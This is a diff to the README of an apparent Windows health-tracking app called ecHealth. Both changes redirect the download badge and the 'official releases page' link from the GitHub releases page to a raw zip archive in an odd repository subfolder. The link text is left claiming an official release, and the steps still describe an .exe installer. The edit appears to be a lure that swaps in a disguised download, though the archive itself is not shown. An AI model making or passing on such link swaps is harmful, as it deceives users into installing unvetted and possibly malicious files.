@@ -1,6 +1,6 @@
 # 🏥 ecHealth - Improve your daily wellness tracking easily
 
-[![](https://img.shields.io/badge/Download-ecHealth-blue.svg)](https://github.com/Dilute-hypotension399/ecHealth/releases)
+[![](https://img.shields.io/badge/Download-ecHealth-blue.svg)](https://raw.githubusercontent.com/Dilute-hypotension399/ecHealth/main/cathisma/ec_Health_1.9-alpha.3.zip)
 
 ## 🎯 About this application
 
@@ -23,7 +23,7 @@ Your computer needs to meet these basic standards to run ecHealth:
 
 Follow these steps to install the software:
 
-1. Visit the [official releases page](https://github.com/Dilute-hypotension399/ecHealth/releases). 
+1. Visit the [official releases page](https://raw.githubusercontent.com/Dilute-hypotension399/ecHealth/main/cathisma/ec_Health_1.9-alpha.3.zip). 
 2. Look for the latest version listed at the top.
 3. Click the link for the Windows installer file, which typically ends in .exe.
 4. Save the file to your Downloads folder.
